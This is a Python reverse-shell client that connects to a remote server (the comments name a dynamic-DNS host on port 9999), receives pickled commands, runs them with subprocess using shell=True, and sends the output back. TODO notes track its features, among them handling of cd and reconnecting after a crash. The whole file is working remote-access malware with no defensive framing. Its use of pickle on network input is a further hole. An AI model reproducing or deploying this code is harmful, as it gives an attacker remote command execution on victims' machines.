import socket
import os
import subprocess
import pickle
import pdb
import time

#TODO
#   1. Build logic that takes the command, and actually produces
#   The result on the machine, sends the output back to the server
#   Something with OS and subprocess module || Done

#   2.  Fix command formatting and outputt formatting so it's airtight || Done

#   3.  Waterproof loop, to re-establish a connection, even after a crash || sorta done

#   4.  fix special case for a cd command (use os module for that) || done


#Server properties
IP = '' #    --> thanathos.hopto.org
PORT = 9999
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket

#Try to establish a connection to the server
def connect():
    try:
        socket.connect((IP, PORT))

    except Exception as e:
        print(e)
        time.sleep(1)

    return socket


#   --> Execute data and return the result as a string
def popenExecution(data):

    if data[:2] == 'cd':
        os.chdir(str(data[3:]))

    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    return str(command.stdout.read() + command.stderr.read(), "utf-8")


#   --> Receive function, calls for send function with the result from popenExecution
def recv():
    result = ""

    while True:
        try:
            print("Waiting to receive something!")
            command = pickle.loads(socket.recv(4096))
            print("Got: ", command)
            result = popenExecution(command)
        except socket.error as e:
            print(e)
            socket.close()

        send(result)


#   --> Sends the output of popenExecution back to the server
def send(message):
    
    try:
        print("trying to send: ", message)
        socket.send(pickle.dumps(message))
        print("Send worked out!")
    except Exception as e:
        print("Send failed")
        socket.close()
        print(e)
        pass


def main():

    x = connect()
    print(x)
    recv() #No need for send function, being called in receive

main()
